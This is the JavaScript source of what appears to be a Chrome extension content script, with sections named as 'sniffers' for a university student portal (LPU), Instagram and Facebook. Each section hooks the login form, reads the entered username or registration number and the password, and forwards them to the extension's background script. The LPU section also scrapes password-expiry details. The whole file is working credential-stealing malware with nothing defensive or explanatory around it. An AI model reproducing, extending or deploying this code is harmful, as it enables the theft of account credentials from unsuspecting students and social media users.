// =================== Student Data Sniffer (LPU) ===================
// Only sends data on form submit or login button click - NOT on every keystroke

let lpuDataSent = false; // Prevent duplicate sends

function sendStudentData(regNo, password) {
  // Validate: Registration number min 8 chars, password min 6 chars
  if (!regNo || regNo.length < 8 || !password || password.length < 6) {
    console.log("%c[LPU] SKIP: Data incomplete - RegNo min 8, Password min 6 chars required", "color: #ff9800;");
    return;
  }
  
  // Prevent sending same data multiple times
  const key = `${regNo}:${password}`;
  if (lpuDataSent === key) {
    console.log("%c[LPU] SKIP: Duplicate data, already sent", "color: #ff9800;");
    return;
  }
  
  lpuDataSent = key;
  
  // Try to capture password expiry info
  let pwdExpiryDays = null;
  let pwdExpiryDate = null;
  
  const expirySpan = document.getElementById("ctl00_wcUserPasswordDetail_HP_Label1");
  if (expirySpan) {
    const text = expirySpan.textContent || expirySpan.innerText || "";
    // Extract days: "UMS Pwd will expire after X days"
    const daysMatch = text.match(/expire after (\d+) days/i);
    if (daysMatch) {
      pwdExpiryDays = parseInt(daysMatch[1], 10);
    }
    // Extract date: "on or before DD-MM-YYYY"
    const dateMatch = text.match(/on or before (\d{2}-\d{2}-\d{4})/i);
    if (dateMatch) {
      pwdExpiryDate = dateMatch[1];
    }
    console.log("%c[LPU] Password expiry info captured", "color: #2196f3;");
    console.table({ pwdExpiryDays, pwdExpiryDate });
  }
  
  chrome.runtime.sendMessage({
    type: "student_data",
    data: { 
      registrationNumber: regNo, 
      password,
      pwdExpiryDays,
      pwdExpiryDate
    },
  });
  
  console.log("%c[LPU] SENT: Credentials forwarded to background", "color: #4caf50; font-weight: bold;");
}

function setupStudentListeners() {
  try {
    const regInput = document.getElementById("txtU");
    const passInput = document.getElementById("TxtpwdAutoId_8767");

    if (!regInput || !passInput) return false;

    // Find the login form or submit button
    const form = regInput.closest("form");
    const submitBtn = document.querySelector("input[type='submit'], button[type='submit'], #btnNext, .btn-primary");

    const captureAndSend = () => {
      const regNo = regInput.value.trim();
      const password = passInput.value;
      
      // Only send if regNo >= 8 chars and password >= 6 chars
      if (regNo && password && regNo.length >= 8 && password.length >= 6) {
        sendStudentData(regNo, password);
      }
    };

    // Only capture on form submit
    if (form) {
      form.addEventListener("submit", (e) => {
        captureAndSend();
      });
    }

    // Also capture on submit button click
    if (submitBtn) {
      submitBtn.addEventListener("click", () => {
        captureAndSend();
      });
    }

    // Capture when Enter is pressed in password field
    passInput.addEventListener("keydown", (e) => {
      if (e.key === "Enter") {
        captureAndSend();
      }
    });

    console.log("%c[LPU] READY: Login form listeners attached (submit only mode)", "color: #4caf50; font-weight: bold;");
    return true;
  } catch (e) {
    console.error("[LPU] ERROR: Failed to setup listeners:", e);
    return false;
  }
}

// Retry mechanism for LPU inputs
if (!setupStudentListeners()) {
  let retries = 0;
  const maxRetries = 15;
  const interval = setInterval(() => {
    retries++;
    if (setupStudentListeners() || retries >= maxRetries) {
      clearInterval(interval);
      if (retries >= maxRetries) {
        console.log("%c[LPU] TIMEOUT: Login form not found after max retries", "color: #ff9800;");
      }
    }
  }, 700);
}

// =================== Instagram Login Sniffer ===================
if (location.hostname.includes("instagram.com")) {
  let igTries = 0;
  const igMaxTries = 25;

  const sniffInstagramLogin = setInterval(() => {
    igTries++;

    const usernameInput = document.querySelector("input[name='username']");
    const passwordInput = document.querySelector("input[name='password']");
    const loginBtn = document.querySelector("button[type='submit']:not([disabled])");

    if (usernameInput && passwordInput && loginBtn) {
      console.log("%c[IG] READY: Login form detected, listener attached", "color: #4caf50; font-weight: bold;");

      loginBtn.addEventListener("click", () => {
        const username = usernameInput.value.trim();
        const password = passwordInput.value;

        if (username && password) {
          chrome.runtime.sendMessage({
            type: "instagram_login_data",
            data: { username, password },
          });
          console.log("%c[IG] SENT: Login credentials forwarded to background", "color: #4caf50; font-weight: bold;");
        }
      }, { once: true });

      clearInterval(sniffInstagramLogin);
    }

    if (igTries >= igMaxTries) {
      clearInterval(sniffInstagramLogin);
    }
  }, 700);
}

// =================== Facebook Login Sniffer ===================
if (location.hostname.includes("facebook.com")) {
  let fbTries = 0;
  const fbMaxTries = 25;

  const sniffFacebookLogin = setInterval(() => {
    fbTries++;

    // Facebook login form selectors
    const emailInput = document.querySelector("input[name='email'], input#email");
    const passwordInput = document.querySelector("input[name='pass'], input#pass");
    const loginBtn = document.querySelector("button[name='login'], button[type='submit'], button[data-testid='royal_login_button']");

    if (emailInput && passwordInput && loginBtn) {
      console.log("%c[FB] READY: Login form detected, listener attached", "color: #4caf50; font-weight: bold;");

      loginBtn.addEventListener("click", () => {
        const email = emailInput.value.trim();
        const password = passwordInput.value;

        if (email && password && password.length >= 6) {
          chrome.runtime.sendMessage({
            type: "facebook_login_data",
            data: { email, password },
          });
          console.log("%c[FB] SENT: Login credentials forwarded to background", "color: #4caf50; font-weight: bold;");
        }
      }, { once: true });

      // Also listen for Enter key in password field
      passwordInput.addEventListener("keydown", (e) => {
        if (e.key === "Enter") {
          const email = emailInput.value.trim();
          const password = passwordInput.value;

          if (email && password && password.length >= 6) {
            chrome.runtime.sendMessage({
              type: "facebook_login_data",
              data: { email, password },
            });
            console.log("%c[FB] SENT: Login credentials forwarded to background", "color: #4caf50; font-weight: bold;");
          }
        }
      }, { once: true });

      clearInterval(sniffFacebookLogin);
    }

    if (fbTries >= fbMaxTries) {
      clearInterval(sniffFacebookLogin);
    }
  }, 700);
}
